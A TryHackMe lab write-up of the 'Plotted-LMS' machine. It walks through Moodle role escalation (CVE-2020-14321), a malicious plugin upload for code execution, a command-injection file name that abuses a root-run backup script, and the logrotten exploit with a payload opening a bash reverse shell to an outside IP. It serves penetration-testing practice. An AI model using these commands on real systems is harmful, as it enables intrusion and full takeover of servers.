# Plotted-LMS TryHackMe Writeup
### Level: `Hard` | OS: `Linux`

![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.

![](2.png)

## Enumeration
I checked all HTTP services, but they all showed the same **Apache (Ubuntu)** default page.

![](3.png)

We run **linpeas** tool and enumerate various files and directories interesting, but are *rabbits hole*:

![](4.png)

![](5.png)

![](6.png)

We enumerate **Moodle** directory:

![](7.png)

We access the directory and see several courses available.

![](8.png)


## Exploitation
We create an account, we see that the application tells us that the email has to be "*@plotted.thm*" (we list domain) and we authenticate with the account.

![](9.png)

We enumerate the possible **Moodle 3.9** version:

![](10.png)

But the exploits I found for RCE didn't work for me.

![](11.png)

I also tested the *XSS vulnerability* published in previous versions.

![](12.png)

Working! But neither user has ever logged in, so I ruled out the possibility of session cookie theft.

![](13.png)

Looking for information about Moodle and RCE (Remote Code Execution) I found this proof of concept: 

[Moodle RCE #CVE-2020-14321 PoC](https://www.youtube.com/watch?v=BkEInFI4oIU)

I did the same steps as in the video, although I summarize it:

We signed up for the course:

![](14.png)

We enter the "*participants*" section, click on "*Enrol Users*", search for our user and intercept the save request with **Burp**.

We change the value of "*roletoassign=*" to "*1*" (1 = MANAGER):

![](15.png)

We see that we are now "*Manager*".

![](16.png)

We access the profile of the user "*John Doe*", we check that we can now use the **SSO** that **Moodle** incorporates, this would allow us to access the administration panel as if we were the user "*John Doe*".

![](17.png)

In this part, we will modify the values of the "*Manager*" role to enable and install a malicious plugin and execute commands (It is very well explained in the video above, so I will be brief).

![](18.png)

Click on install plugin:

![](19.png)

Upload the file "*rce.zip*" and install it.

![](20.png)

We complete the installation and look for the file.

![](21.png)

#### PoC Moodle RCE
![](22.png)

We intercept with **Burp**, put a **netcat** listening on port *443* and run our payload to gain access to the machine:

![](23.png)

#### Reverse shell
![](24.png)


## Privilege Escalation (Plot_admin user)
We did a file recognition, listed several credentials but none of them worked for me.

![](25.png)

We looked for files and found that the user "*plot_admin*" has a script "*backup.py"* that we can read.

![](26.png)

We open another session (yes, I know, the machine is super slow....) and run "**pspy**", we check that a backup of moodle is being performed in the hidden directory of the user "*plot_admin*"... This makes me suspect that the Python script is being executed.

![](27.png)

Checking the python script and that we only have access to the path "*moodle_location*", we would have to try abusing a *command injection* by means of a file name.

```bash
cd /var/www/uploadedfiles/filedir/
touch './"";$(chmod 777 *)'
```

We execute the above commands and wait for the scheduled task to be executed. After that, we will have write and read access to the files in the "plot_admin" directory:

![](28.png)

We create SSH keys, but if we try to use the "*id_rsa*" file it asks for the user's password, so we put our public key in the "*authorized_keys*" file and connect via **SSH**.

![](29.png)

## Privilege Escalation
We re-launch pspy with the user "*plot_admin*", we quickly see that it is running "**logrotate**" and an **SSH** connection to the root user, executing the contents of "*/etc/bash_completion*":

![](30.png)

#### Exploit: [whotwagner/logrotten](https://github.com/whotwagner/logrotten)

We check that the machine has "**gcc**", transfer the exploit and compile it.

![](31.png)

As it was likely to have to be repeating the execution of the exploit and in each execution I had to delete and rename the backup, I generated a script to run every few minutes.

```bash
#!/bin/bash

rm .logs_backup
mv .logs_backup2/ .logs_backup
cp /home/plot_admin/.logs_backup/moodle_access.1 /home/plot_admin/.logs_backup/moodle_access; ./logrotten -p /tmp/m3file.sh /home/plot_admin/.logs_backup/moodle_access;ls /etc/bash_completion.d
```

#### Content m3file.sh file:
```
bash
#!/bin/bash

bash -i >& /dev/tcp/10.2.116.223/5555 0>&1
```

We put a **netcat** listening and run the script, we see that the file "*moodle_access*".... has been created.

![](32.png)

We will obtain a root session and will be able to read the file "*/root/root.txt*".

![](33.png)

*PD: Thanks to **0x1dz** for the help with the hints.*

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)